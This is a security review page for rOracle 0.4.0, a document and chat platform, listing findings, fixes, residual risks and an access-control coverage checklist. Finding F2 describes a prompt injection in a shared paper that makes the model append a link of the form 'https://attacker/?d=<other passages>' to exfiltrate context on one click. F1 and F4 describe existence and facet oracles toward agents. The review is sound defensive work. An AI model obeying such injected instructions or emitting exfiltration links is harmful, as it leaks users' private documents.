# Security review 2026-11

Part of the [security architecture](../security.md). This page records the November 2026 security review of rOracle
0.4.0: what was reviewed, how, what was found and what became of each finding. Accepted residuals are in
[known limits](known-limits.md).

## Scope, method and versions

| | |
|---|---|
| Date | 2026-11-18 |
| Version reviewed | rOracle 0.4.0, `origin/main` at `4c0a1b9` (merge of PR #35, P15 hardening) |
| Fixes | branch `fix/security-review` on top of `4c0a1b9` (commits below) |
| Code in scope | `backend/src/roracle`, `frontend/src`, `frontend/nginx`, `deploy/helm/roracle`, `deploy/terraform` (secret paths only) |
| Docs in scope | `docs/enterprise/security/*`, `docs/adr` |

Method: a read-only source review, without a live stack. Each area in the [coverage checklist](#coverage-checklist)
was traced from the route or tool entry point through the access helpers (`visible_documents`, `readable_documents`,
`acl_filter`, label gates) to every output path (search hits and cards, chat context, MCP tools, handoffs, exports,
notifications). Every security claim in the documentation was then checked against the code. Each fix was written
test first, as the smallest change, and verified with the backend unit and integration suites, the frontend tests and
the docs checks.

Already-fixed issues from the P15 hardening reviews (below) were not re-reported.

## Prior hardening review (P15, 2026-11-17)

The P15 hardening branch (merged as 0.4.0) had a whole-branch final review and a scoped re-review of its fix wave.

| ID | Finding | Outcome |
|---|---|---|
| C1 | An OAuth agent token (`azp` `roracle-mcp`) was a full human session on REST: admin, `manage`, could mint PATs | Fixed: `azp` in `ROR_OIDC_AGENT_CLIENTS` makes the token an agent on REST and `/mcp` (never admin, no `manage`) |
| I1 | `DELETE /drafts/{id}` soft-deleted a published paper at `write` scope | Fixed: refused (409) once the draft has a publication, at any scope; the paper is deleted from the Library (needs `manage`) |
| I2 | MCP write-scope denials wrote no `auth.scope_denied` row | Fixed: MCP write tools and handoff notes go through `require_scope` |
| I3 | Replayed audit rows were invisible to the admin user filter | Fixed: replay keeps `user_id` while the user exists; the filter also matches `detail.user_id` |
| I4 | Docs said OAuth on `/mcp` bypassed the label gates | Fixed: docs and docstrings state the agents-everywhere rule |
| M1 | Deleted papers free quota before their blobs are purged | Accepted, now in [known limits](known-limits.md#platform-and-supply-chain) |
| M2 | RAPTOR and the draft style check send document text unquoted | Accepted, now in [known limits](known-limits.md#labels-and-handoffs) |
| M3-M6 | Helm helper dead branch, empty REST scope-denial target, `failure_status` mapping, token-scope tuple order | Cosmetic; left as minors |

Re-review verdict: all Critical and Important findings addressed, no new Critical or Important breakage. Two minors
remained: a human can still soft-delete an `in_review` draft that has a publication, and one sentence in the upgrades
page is repeated.

## Summary

| Severity | Count | Fixed | Accepted residual |
|---|---|---|---|
| Critical | 0 | | |
| High | 0 | | |
| Medium | 0 | | |
| Low | 4 | 4 | 3 (narrowed, documented) |

The authorization core is consistent and fails closed. One SQL visibility function is mirrored by the Elasticsearch
filter and backed by a Postgres re-check on every output path. `is_agent` covers PATs, `/mcp` and OAuth agent clients.
Scope checks come before any lookup, and the label gates reach search, cards, chat, MCP, handoffs, exports,
notifications, drafts, evidence and every ingest-time LLM path. No exploitable IDOR, scope bypass, injection, SSRF,
XSS or token-validation flaw was found. The four Low findings were two small existence or metadata oracles toward
agents, one click-to-exfiltrate prompt-injection residual and one quota bypass.

## Findings

| ID | Finding | Severity | Status |
|---|---|---|---|
| F1 | Near-duplicate detection ran as the owner's human principal, giving agents (and admin-owned PATs) an existence oracle for hidden documents | Low | Fixed in `f38da7e` |
| F2 | Prompt-injected answers could carry clickable external links that exfiltrate context on one click | Low | Fixed in `b367e41`; residual accepted |
| F3 | Evidence uploads bypassed `ROR_UPLOAD_QUOTA_BYTES` | Low | Fixed in `1617378` |
| F4 | Browse totals and facets come from Elasticsearch only, so the async `acl_sync` after a proposal-approved label raise leaked facet metadata to agents | Low | Fixed in `6c7c408`; residual accepted |

### F1: near-duplicate oracle across the agent gate

Ingest rebuilt the owner's human principal for both near-duplicate searches: never an agent, and admin when the owner
was. An agent could upload a candidate file and read `stage: review` from `/api/me/uploads` whenever a near-identical
`block_agents` document (or, for an admin owner, any user's private paper) existed. The near-dup decision then
answered 403 before the agent-visibility 409, revealing whether the hidden match belonged to someone else.

Fix: agent uploads carry an `agent` marker (the principal's groups, a PAT's snapshot) in the ingest job payload;
`auth.principal_for_upload` turns it into a non-admin agent principal, so a hidden match is no match and the version
is `deduped` exactly as with no match. Restarting ingest after a title is set keeps the marker. The near-dup decision
checks agent visibility before ownership.

Residual: done jobs are pruned after 7 days; a title set after that falls back to the caller's view
([known limits](known-limits.md#retrieval-and-label-timing)).

### F2: link exfiltration from prompt-injected answers

`AnswerText` rendered model output with clickable `target=_blank` links for any `http(s)` URL. A hidden instruction in
a shared paper could make the model append `[details](https://attacker/?d=<other passages>)`; one click sent the
data.

Fix: in chat answers, external links are plain text showing the full URL; same-site, fragment and citation links stay
clickable. Notes (user-authored) are unchanged.

Residual: a user who copies a shown URL into the browser still sends what it encodes
([known limits](known-limits.md#labels-and-handoffs)).

### F3: evidence uploads bypassed the quota

The quota was enforced only for document uploads; evidence streamed up to `evidence_max_bytes` (1 GiB) per file with
no per-user limit, and each file cost a ClamAV scan.

Fix: `roracle.quota` sums a user's live uploaded document versions plus evidence files under one per-user advisory
lock. Document and evidence uploads both call it and return the same 413 `upload quota exceeded`.

### F4: facet and count window after a proposal-approved label raise

Browse totals and facet buckets come from Elasticsearch aggregations; only the rows are re-checked in Postgres. A label
raise approved through a proposal only enqueued `acl_sync`, so until the worker ran, agents still saw the document
counted and its author, venue and tag values in facets.

Fix: the direct label route's sequence (delayed durable `acl_sync`, `sync_acl` from the transaction, commit; on error
roll back, re-sync and 503) is now `documents_write.commit_with_acl`, used by the label route and by single and bulk
proposal approval. The queued `acl_sync` stays as the retry. This was preferred over filtering facets through the
Postgres post-check, which would add a Postgres pass to every facet query.

Residual: paths that still reach Elasticsearch only through `acl_sync` (a near-duplicate merge raising the target's
label, recovery after an ES error, a label backfill) keep the window
([known limits](known-limits.md#retrieval-and-label-timing)).

## Coverage checklist

| Area | Result |
|---|---|
| JWT validation (`auth.py` `_verify`) | RS256 only, `kid` required, `iss`/`aud`/`exp`/`sub` required, `typ=Bearer`, `azp` allow-list, JWKS refetch throttled, fail closed after 1 h. OK |
| OAuth agent clients (`_jwt_principal`, `as_agent`) | `azp` in the agent list gives `via=mcp`, non-admin, no `manage`, on REST and `/mcp`. OK (D15) |
| PAT storage and comparison (`pats.py`) | 256-bit random, SHA-256 lookup by indexed hash (no timing oracle), expiry, revocation, owner sign-in bound, group snapshot ∩ current, never admin. OK |
| Scope enforcement | REST non-GET needs `write`; `manage` via `require_scope` before lookup on every listed route; all MCP write tools call `_need_write`. OK |
| Admin routes | Every `/admin/*` handler depends on `require_admin` (admin and `via=="jwt"`). OK |
| Human-only routes | Notes, labels, proposals, evidence writes and citation acks use `require_human`; tokens use `require_jwt`. OK |
| Document IDOR | `visible_doc`/`readable_documents` plus owner checks, 404 before 403. OK (F1 fixed) |
| Drafts | `readable_draft` (owner, co-author, admin, agent gate), `require_text` on every text output. OK |
| Chats | Owner-only writes, read-only shares, per-reader citation re-check, agent gating of viewer and pins. OK |
| Handoffs | Audience re-checked per load, `block_agents` dropped for all, agent text withholding, 8-character code with 404 normalisation. OK |
| Notes and proposals | `readable_notes` (root rule, agent gate on own and root label), proposals scoped to owner, approver's rights apply. OK |
| Evidence | Readable-note check, attachment only with `CSP: sandbox` and `nosniff`, label gates, scan status. OK (F3 fixed) |
| Label gates: search, cards, facets | ES `acl_filter` plus Postgres re-check plus `gated_docs`. OK (F4 fixed, residual documented) |
| Label gates: chat, ask, global, agentic, summarize | `exclude_llm` in ES and `llm_allowed`; selection and pins dropped. OK |
| Label gates: exports | `require_exportable`/`exportable_clause`; agents always download. OK |
| Label gates: notifications, proposals, `/me/uploads`, collections | Agent hiding of named documents and notes; `readable_documents` on titles. OK (F1 fixed) |
| Label gates: ingest LLM paths | Label re-read before summary, context, RAPTOR, autotag and eval calls. OK |
| Prompt injection | Delimited and quoted passages, notes, units, titles; strict upvote gate on notes; read-only chat tools. OK (F2 fixed; D18) |
| SSRF: HTTP connector (`netguard.py`) | Connect-time vetting, mapped/NAT64/6to4/Teredo handling, metadata never-list, manual redirects, no proxies. OK |
| SSRF: S3 connector, evidence URIs, parsers | S3 endpoint admin-chosen (documented); evidence URIs never fetched; parsers have no egress. OK |
| Filesystem connector | `realpath` allow-list, `O_NOFOLLOW` descent, regular files only; hardlinks documented. OK |
| Uploads | Streamed with cap, content-addressed keys, client `Content-Type` never trusted on download, dedup only against readable documents. OK |
| Parsers (zip bombs, XXE) | lxml without entities or network; ClamAV `MaxScanSize` and `AlertExceedsMax`; Docling page and size limits; sandboxed pods. OK (D7) |
| Draft PDF build | pandoc `--sandbox`, raw off, AST allow-list, CSP meta, Chromium Gotenberg without egress. OK |
| YAML/JSON deserialization | `yaml.safe_load` only; front matter rejects anchors and aliases; no pickle or eval. OK |
| SQL injection | ORM and bound parameters; the only f-string `text()` is static; LIKE escaped. OK |
| ES query injection, ReDoS | Facet regex escaped; painless scripts take params only; no `query_string` on user input. OK |
| XSS (frontend) | No `dangerouslySetInnerHTML` or rehype-raw; `safeHref`; images suppressed; KaTeX `trust` off. OK (D5) |
| CSRF, CORS, session | Bearer-only API, no CORS middleware, OIDC tokens in sessionStorage, same-origin `returnTo`. OK |
| CSP and headers (nginx) | Strict app CSP (`script-src 'self'`), `nosniff`, `no-referrer`, COOP; `/docs/` inline CSP only for static docs. OK (D17) |
| nginx proxy | `/api/metrics` and `/api/readyz` blocked including `//` and `%xx` variants; OpenAPI exposed. OK (D19) |
| Rate limiting | Per-principal token bucket per replica, off by default; OAuth agents share the user's bucket. OK (D15) |
| Secrets in logs and config | Settings API exposes whitelisted keys only; connector secret masked; no token or body in audit. OK |
| Audit integrity | Durable replay, scope/admin/rate-limit denials recorded, `user_id` kept. OK (D1-D3) |
| Helm pod security | `runAsNonRoot`, `RuntimeDefault`, no privilege escalation, drop ALL, read-only root FS, no SA token automount. OK |
| NetworkPolicy | Default deny, parsers zero egress, scoped egress; api port reachable from web and ingress namespaces. OK (D6) |
| Terraform secrets | `create` mode puts values in state (documented); separate backup identities. OK |
| Runtime settings API | Admin-only, strict schema, security keys limited to `pats_enabled`, rate limit, quotas and note thresholds. OK |
